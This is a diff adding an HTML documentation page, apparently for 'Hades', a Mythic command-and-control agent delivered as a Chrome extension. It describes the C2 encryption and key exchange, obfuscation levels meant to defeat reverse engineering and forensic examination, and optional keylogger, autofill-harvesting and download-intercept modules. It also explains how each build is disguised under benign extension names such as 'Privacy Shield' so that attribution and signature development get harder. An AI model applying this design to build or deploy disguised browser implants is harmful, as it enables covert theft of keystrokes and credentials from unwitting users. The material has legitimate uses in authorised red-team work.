+<td>Application</td>
+<td>AES-256-CBC + HMAC-SHA256</td>
+</tr>
+</tbody>
+</table>
+<p>Wire format: <code>base64( UUID[36] + IV[16] + AES-CBC(plaintext) + HMAC-SHA256[32] )</code></p>
+<p>This matches Mythic's native <code>aes256_hmac</code> format.</p>
+<h3 id="key-modes">Key modes<a class="headerlink" href="#key-modes" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Mode</th>
+<th><code>encrypted_exchange_check</code></th>
+<th>Key source</th>
+<th>Forward secrecy</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PSK</strong> (static)</td>
+<td><code>false</code></td>
+<td>AES-256 key baked into payload at build time</td>
+<td>No</td>
+</tr>
+<tr>
+<td><strong>EKE</strong> (RSA key exchange)</td>
+<td><code>true</code></td>
+<td>Per-session key negotiated via RSA-OAEP at first contact</td>
+<td>Yes</td>
+</tr>
+</tbody>
+</table>
+<h3 id="eke-handshake-step-by-step">EKE handshake (step by step)<a class="headerlink" href="#eke-handshake-step-by-step" title="Permanent link">&para;</a></h3>
+<ol>
+<li>Agent generates a random 32-byte AES session key</li>
+<li>Agent RSA-OAEP encrypts the session key with Mythic's RSA public key (embedded at build)</li>
+<li>Agent sends <code>base64(PayloadUUID + RSA_encrypt(session_key))</code> -- raw, not AES-encrypted</li>
+<li>Mythic decrypts with its RSA private key, generates a permanent session key</li>
+<li>Mythic responds (encrypted with the temp key): <code>{action: "staging_rsa", uuid, session_key}</code></li>
+<li>Agent imports the permanent session key and staging UUID</li>
+<li>Agent sends a normal AES-encrypted check-in using the permanent key</li>
+<li>All subsequent traffic uses the permanent session key</li>
+</ol>
+<p>Even if the <code>.zip</code> payload is captured, the RSA public key cannot decrypt traffic. Only<br />
+Mythic's server-side RSA private key can recover session keys.</p>
+<hr />
+<h2 id="14-code-obfuscation">14. Code Obfuscation<a class="headerlink" href="#14-code-obfuscation" title="Permanent link">&para;</a></h2>
+<p>The <code>obfuscate</code> build parameter runs <code>javascript-obfuscator</code> on all <code>.js</code> files in the<br />
+extension zip at build time. Each level adds techniques on top of the previous one.</p>
+<h3 id="level-none">Level: <code>none</code><a class="headerlink" href="#level-none" title="Permanent link">&para;</a></h3>
+<p>No transformation. Source code is human-readable. Useful for debugging.</p>
+<ul>
+<li>Output is identical to the source (after placeholder substitution and command stripping)</li>
+<li>File size: baseline (1x)</li>
+</ul>
+<h3 id="level-low">Level: <code>low</code><a class="headerlink" href="#level-low" title="Permanent link">&para;</a></h3>
+<p>Defends against casual inspection. Fast build times.</p>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>String array extraction</strong></td>
+<td>All string literals (<code>"chrome"</code>, <code>"tabs"</code>, <code>"[Hades]"</code>, etc.) are moved into a single array. Code references them by index via wrapper functions.</td>
+</tr>
+<tr>
+<td><strong>String array RC4 encoding</strong></td>
+<td>The string array entries are RC4-encrypted. A decoder function decrypts them at runtime. Prevents simple <code>strings</code> or <code>grep</code> from finding keywords.</td>
+</tr>
+<tr>
+<td><strong>Hex identifier renaming</strong></td>
+<td>All local and global variable/function names are replaced with hex identifiers (e.g. <code>cmdScreenshot</code> -&gt; <code>_0xa3f1e2</code>).</td>
+</tr>
+<tr>
+<td><strong>Compact output</strong></td>
+<td>Whitespace and formatting removed. Single-line output.</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>File size: ~2x baseline</li>
+<li>Build time: seconds</li>
+</ul>
+<h3 id="level-medium-recommended-default">Level: <code>medium</code> (recommended default)<a class="headerlink" href="#level-medium-recommended-default" title="Permanent link">&para;</a></h3>
+<p>Significantly raises the cost of manual reverse engineering.</p>
+<p>Includes everything from <code>low</code>, plus:</p>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Control flow flattening (50%)</strong></td>
+<td>Half of all function bodies are rewritten as <code>while(true) { switch(state) { ... } }</code> state machines. The original sequential logic is scrambled across numbered states. An analyst cannot read the code linearly.</td>
+</tr>
+<tr>
+<td><strong>Dead code injection (20%)</strong></td>
+<td>20% of code blocks have unreachable but plausible-looking code paths inserted. These contain realistic variable names and operations. Analysts must trace control flow to distinguish real from fake code.</td>
+</tr>
+<tr>
+<td><strong>String splitting (10-char chunks)</strong></td>
+<td>Remaining string literals are split into 10-character fragments joined by concatenation (<code>"background" -&gt; "backgr" + "ound"</code>). Defeats simple substring searches.</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>File size: ~3--4x baseline</li>
+<li>Build time: 5--15 seconds</li>
+</ul>
+<h3 id="level-high">Level: <code>high</code><a class="headerlink" href="#level-high" title="Permanent link">&para;</a></h3>
+<p>Maximum static analysis resistance. Use when the payload may be forensically examined.</p>
+<p>Includes everything from <code>medium</code>, plus:</p>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Control flow flattening (75%)</strong></td>
+<td>Three-quarters of function bodies become state machines. Almost no linear code remains.</td>
+</tr>
+<tr>
+<td><strong>Dead code injection (40%)</strong></td>
+<td>Nearly half of all code blocks contain fake paths. The ratio of real to decoy code approaches 1:1.</td>
+</tr>
+<tr>
+<td><strong>String array function wrappers (3, chained)</strong></td>
+<td>String array access goes through 3 layers of wrapper functions that call each other. Tracing a single string reference requires following a chain of 3+ function calls.</td>
+</tr>
+<tr>
+<td><strong>String array call transform</strong></td>
+<td>The wrapper functions are additionally transformed so their call patterns vary. No two string lookups look identical in the AST.</td>
+</tr>
+<tr>
+<td><strong>String array threshold (80%)</strong></td>
+<td>80% of all strings (including short ones like <code>"id"</code>, <code>"ok"</code>) are moved to the encrypted array. Very few inline strings remain.</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>File size: ~5--8x baseline</li>
+<li>Build time: 15--60 seconds</li>
+<li><strong>Note:</strong> <code>--transform-object-keys</code> and <code>--numbers-to-expressions</code> are intentionally<br />
+  excluded from this level. They break Web Crypto API parameter objects<br />
+  (<code>{name: "RSA-OAEP", hash: "SHA-1"}</code>) and numeric constants in the AES/HMAC code.</li>
+</ul>
+<h3 id="what-obfuscation-does-not-rename">What obfuscation does NOT rename<a class="headerlink" href="#what-obfuscation-does-not-rename" title="Permanent link">&para;</a></h3>
+<p>Chrome extension API property names (<code>chrome.tabs.query</code>, <code>chrome.runtime.sendMessage</code>,<br />
+<code>crypto.subtle.importKey</code>, etc.) are external APIs resolved at runtime. They cannot be<br />
+renamed. An analyst can still identify Chrome API usage patterns, but the agent's internal<br />
+logic -- command dispatch, crypto protocol, C2 handling -- becomes opaque.</p>
+<hr />
+<h2 id="15-modular-command-inclusion">15. Modular Command Inclusion<a class="headerlink" href="#15-modular-command-inclusion" title="Permanent link">&para;</a></h2>
+<p>The builder only includes code for commands selected in the Mythic UI's <strong>Commands</strong> step.</p>
+<h3 id="how-it-works_1">How it works<a class="headerlink" href="#how-it-works_1" title="Permanent link">&para;</a></h3>
+<ol>
+<li>Every command's code in <code>background.js</code> is wrapped in <code>// __CMD__ name</code> / <code>// __ENDCMD__</code><br />
+   marker comments (both the dispatcher entry and the implementation function)</li>
+<li>At build time, the builder reads which commands the operator selected</li>
+<li><code>strip_unused_commands()</code> removes all marked blocks whose command tags don't match</li>
+<li>Content scripts are conditionally included:</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>Content script</th>
+<th>Included when</th>
+<th>Excluded when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>keylogger.js</code></td>
+<td><code>keylog</code> or <code>disable_keylog</code> selected</td>
+<td>Neither selected</td>
+</tr>
+<tr>
+<td><code>autofill.js</code></td>
+<td><code>keylog</code> or <code>disable_keylog</code> selected</td>
+<td>Neither selected</td>
+</tr>
+</tbody>
+</table>
+<ol>
+<li><code>manifest.json</code> content_scripts entries are updated to match (excluded scripts are<br />
+   removed from the manifest)</li>
+<li><code>sleep</code> and <code>exit</code> are always included regardless of selection</li>
+</ol>
+<h3 id="why-this-matters">Why this matters<a class="headerlink" href="#why-this-matters" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Reduced fingerprint</strong>: Each build contains only the capabilities needed for that<br />
+  operation. A screenshot-only payload has no keylogger code, no proxy module, no download<br />
+  intercept -- making attribution and signature development harder.</li>
+<li><strong>Improved obfuscation</strong>: Fewer functions and strings means the obfuscator's dead code<br />
+  injection and control flow flattening are a larger proportion of the total code. The<br />
+  signal-to-noise ratio for analysts gets worse.</li>
+<li><strong>Smaller payloads</strong>: Excluding the proxy module alone removes ~400 lines. A minimal<br />
+  build (<code>sysinfo</code> + <code>screenshot</code> + <code>exit</code>) is roughly 40% the size of a full build.</li>
+</ul>
+<hr />
+<h2 id="16-filename-identity-randomisation">16. Filename &amp; Identity Randomisation<a class="headerlink" href="#16-filename-identity-randomisation" title="Permanent link">&para;</a></h2>
+<p>Every build produces a unique extension with no shared static indicators.</p>
+<h3 id="what-gets-randomised">What gets randomised<a class="headerlink" href="#what-gets-randomised" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Element</th>
+<th>Default (blank)</th>
+<th>Operator-specified</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Extension name</td>
+<td>Random from pool: "Tab Manager Plus", "Privacy Shield", "Dark Reader Helper", "Page Loader", "Session Sync", etc.</td>
+<td>Operator's exact string</td>
+</tr>
+<tr>
+<td>Extension description</td>
+<td>Random cover description matching the pool</td>
+<td>Operator's exact string</td>
+</tr>
+<tr>
+<td>Extension version</td>
+<td>Random <code>X.Y.Z</code> (e.g. <code>3.7.2</code>)</td>
+<td>Always random</td>
+</tr>
+<tr>
+<td><code>background.js</code> filename</td>
+<td>Random: <code>worker_c3d8.js</code>, <code>a3f9c1e2b7.js</code>, <code>runtime_bf2a.js</code>, etc.</td>
+<td>Operator's string (<code>.js</code> auto-appended)</td>
+</tr>
+<tr>
+<td><code>keylogger.js</code> filename</td>
+<td>Random (same styles as above)</td>
+<td>Operator's string</td>
+</tr>
+<tr>
+<td><code>autofill.js</code> filename</td>
+<td>Random</td>
+<td>Operator's string</td>
+</tr>
+<tr>
+<td><code>manifest.json</code></td>
+<td>Always rewritten with the above values</td>
+<td>--</td>
+</tr>
+</tbody>
+</table>
+<h3 id="filename-generation-styles">Filename generation styles<a class="headerlink" href="#filename-generation-styles" title="Permanent link">&para;</a></h3>
+<p>Random filenames are generated in one of three styles per build:<br />
+- <strong>Hex-like</strong>: <code>a3f9c1e2b7.js</code> (6--12 alphanumeric chars)<br />
+- <strong>Prefixed</strong>: <code>module_bf2a91.js</code>, <code>worker_c3d8.js</code>, <code>helper_a7e2f1.js</code><br />
+- <strong>Functional</strong>: <code>content2847.js</code>, <code>loader91.js</code>, <code>init4523.js</code></p>
+<p>No two builds share the same filenames, extension name, or version number. There are no<br />
+static strings like "Hades", "keylogger", or "autofill" anywhere in the delivered zip.</p>
+<hr />
+<h2 id="17-iterating-on-the-agent">17. Iterating on the Agent<a class="headerlink" href="#17-iterating-on-the-agent" title="Permanent link">&para;</a></h2>
+<h3 id="python-container-changes-commands-builder">Python container changes (commands, builder)<a class="headerlink" href="#python-container-changes-commands-builder" title="Permanent link">&para;</a></h3>
+<pre><code class="language-bash">./mythic-cli build hades
+./mythic-cli start hades
+</code></pre>
+<h3 id="javascript-only-changes">JavaScript-only changes<a class="headerlink" href="#javascript-only-changes" title="Permanent link">&para;</a></h3>
+<p>No container restart needed. Rebuild the payload in the Mythic UI and reload the extension<br />
+in Chrome: <code>chrome://extensions</code> -&gt; extension card -&gt; reload button.</p>
+<h3 id="full-restart">Full restart<a class="headerlink" href="#full-restart" title="Permanent link">&para;</a></h3>
+<pre><code class="language-bash">./mythic-cli stop
+./mythic-cli start
+</code></pre>
+<hr />
+<h2 id="18-troubleshooting">18. Troubleshooting<a class="headerlink" href="#18-troubleshooting" title="Permanent link">&para;</a></h2>
+<p><strong>Container not in <code>mythic-cli status</code>:</strong></p>
+<pre><code class="language-bash">docker logs mythic_hades_1
+</code></pre>
+<p>Look for Python import errors or missing dependencies.</p>
+<p><strong>No callback after loading extension:</strong><br />
+- Check <code>chrome://extensions</code> -&gt; extension card -&gt; <strong>Errors</strong> for JS exceptions<br />
+- Verify <code>callback_host</code> is reachable from the target<br />
+- Confirm the C2 profile container is running and listening<br />
+- Open the service worker console (<code>chrome://extensions</code> -&gt; extension -&gt; <strong>Service Worker<br />
+  -&gt; Inspect</strong>) and look for <code>[Hades]</code> log lines</p>
+<p><strong>Build message shows "WARNING: encrypted_exchange_check=true but key is only 44 chars":</strong><br />
+- The C2 profile was started with <code>encrypted_exchange_check = false</code>. Stop the profile,<br />
+  set it to <code>true</code>, restart it, then rebuild the payload.</p>
+<p><strong>Commands submitted but no output:</strong><br />
+- Run <code>sleep 5</code> to confirm the tasking loop is alive<br />
+- Check <code>[Hades]</code> lines in the service worker console</p>
+<p><strong>Icon not appearing:</strong><br />
+- Must be at <code>&lt;mythic-root&gt;/agent_icons/hades.svg</code> (exact name, Mythic root directory)<br />
+- Restart Mythic after copying the file<br />
+- Or use <strong>Settings -&gt; Payload Types -&gt; hades -&gt; Edit Icon</strong></p>
+<p><strong><code>geolocation</code> returns permission denied:</strong><br />
+- Only works on pages where the user has already granted location access</p>
+<p><strong><code>download_intercept_start</code> not firing:</strong><br />
+- Confirm the intercept was armed <em>before</em> the download started<br />
+- Use WebSocket mode for instant task delivery<br />
+- The pattern match is a case-insensitive substring check on URL and filename</p>
+<p><strong>Obfuscation build fails or extension won't load:</strong><br />
+- Try <code>obfuscate = medium</code> (default). The <code>high</code> level produces larger files that Chrome<br />
+  may be slower to parse.<br />
+- <code>none</code> is useful for debugging but exposes all source code on disk.<br />
+- Check <code>docker logs mythic_hades_1</code> for <code>javascript-obfuscator</code> errors.</p>
+<p><strong>PID shows a small number instead of a real process ID:</strong><br />
+- Chrome extensions cannot access OS-level PIDs. The PID field is a stable hash of<br />
+<code>chrome.runtime.id</code> (the extension's unique 32-character ID). It is consistent across<br />
+  service worker restarts for the same extension installation.</p>
+</div>
+</body>
+</html>
